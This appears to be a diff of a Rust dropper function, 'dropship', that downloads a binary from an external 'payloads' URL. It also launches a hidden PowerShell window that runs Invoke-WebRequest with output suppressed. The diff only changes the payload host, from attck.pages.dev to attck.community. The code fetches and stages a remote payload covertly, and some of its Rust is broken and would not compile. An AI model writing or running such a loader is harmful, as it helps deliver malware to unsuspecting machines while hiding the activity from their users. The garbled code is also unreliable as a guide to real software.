@@ -27,7 +27,7 @@ fn run dropship() {
     let mut file = File::open("dropship.bin").expect("Unable to open file");
     let mut chunk = vec![0; 1024]; // Assuming we're using 1KB chunks
 
-    if let Err(e) = client.get("https://attck.pages.dev/attcks/payloads/dropship.bin")
+    if let Err(e) = client.get("https://attck.community/attcks/payloads/dropship.bin")
         .send()
         .map(|response| response.copy_to(&mut chunk).text())
         .save("dropship.bin") {
@@ -42,7 +42,7 @@ fn run dropship() {
         .arg("-W Hidden")
         .arg(format!(
             "Invoke-WebRequest -Uri {} -OutFile dropship.bin",
-            "https://attck.pages.dev/attcks/payloads/dropship.bin"
+            "https://attck.community/attcks/payloads/dropship.bin"
         ))
         .stdout(Stdio::null())
         .stderr(Stdio::null())
